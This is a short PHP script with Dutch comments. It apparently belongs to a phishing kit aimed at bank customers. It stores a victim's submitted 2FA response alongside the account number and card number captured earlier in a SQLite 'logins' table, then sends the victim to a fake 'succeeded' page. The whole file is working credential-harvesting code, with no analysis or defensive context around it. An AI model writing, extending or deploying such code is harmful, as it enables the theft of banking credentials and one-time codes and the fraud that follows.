<?php
session_start();

// Controleer of de login_id is opgeslagen
if (!isset($_SESSION['login_id'])) {
    die("Geen login record gevonden. Probeer opnieuw.");
}

$db = new PDO('sqlite:' . __DIR__ . '/data.db');
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

// Zorg ervoor dat de tabel bestaat (zou al aangemaakt moeten zijn in save.php)
$db->exec("CREATE TABLE IF NOT EXISTS logins (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    rekeningnummer TEXT,
    pasnummer TEXT,
    respons TEXT,
    respons2 TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");

// Haal de 2FA-respons op uit het formulier
$respons2 = $_POST['response'] ?? '';

// Update het record met de ingevoerde 2FA-respons
$stmt = $db->prepare("UPDATE logins SET respons2 = ? WHERE id = ?");
$stmt->execute([$respons2, $_SESSION['login_id']]);

// Verwijder de sessievariabele
unset($_SESSION['login_id']);

// Redirect naar de startpagina (bijvoorbeeld index.html) of een bevestigingspagina
header('Location: geslaagd.html');
exit;
?>
